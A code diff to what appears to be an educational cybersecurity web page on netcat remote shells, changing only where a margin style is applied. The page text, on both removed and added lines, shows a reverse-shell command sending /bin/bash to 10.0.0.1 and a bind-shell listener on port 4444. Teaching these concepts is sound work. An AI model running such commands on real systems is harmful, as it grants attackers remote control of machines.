@@ -42,14 +42,18 @@ export default function NetcatRemoteShellPage() {
             <p className="text-xs text-cyber-text">
               The target machine connects <em>back</em> to the attacker's machine. Useful when the target is behind NAT or a firewall that blocks inbound connections but allows outbound.
             </p>
-            <CodeBlock code="nc -e /bin/bash 10.0.0.1 4444" className="mt-3" />
+            <div className="mt-3">
+              <CodeBlock code="nc -e /bin/bash 10.0.0.1 4444" />
+            </div>
           </div>
           <div className="cyber-card p-5">
             <h3 className="text-sm font-semibold text-white mb-2">Bind Shell</h3>
             <p className="text-xs text-cyber-text">
               The target machine listens on a port and waits for the attacker to connect. The attacker directly connects to the target.
             </p>
-            <CodeBlock code="nc -l -p 4444 -e /bin/bash" className="mt-3" />
+            <div className="mt-3">
+              <CodeBlock code="nc -l -p 4444 -e /bin/bash" />
+            </div>
           </div>
         </div>
       </motion.section>
